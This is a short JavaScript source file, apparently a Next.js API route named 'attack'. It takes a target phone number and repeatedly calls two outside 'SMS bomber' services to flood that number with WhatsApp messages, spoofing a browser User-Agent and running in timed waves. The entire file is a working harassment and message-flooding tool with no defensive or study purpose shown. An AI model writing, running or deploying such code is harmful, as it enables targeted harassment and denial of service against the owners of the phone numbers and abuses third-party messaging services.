// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 10 : amount; // Test er jonno kom rakhi
    const delay = isUltimate ? 1000 : 3000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (link) => {
        try {
          const response = await fetch(link, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            },
            body: JSON.stringify({
              number: number,
              amount: 1,
              country: "BD",
              service: "whatsapp",
              msg: "Test"
            }),
          });

          const result = await response.text(); // Error message check korar jonno
          console.log(`Link: ${link} | Status: ${response.status} | Response: ${result.substring(0, 50)}`);
          
        } catch (err) {
          console.error(`Link: ${link} | Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: "ATTACK STARTED! Check Console for Debugging" 
  });
}
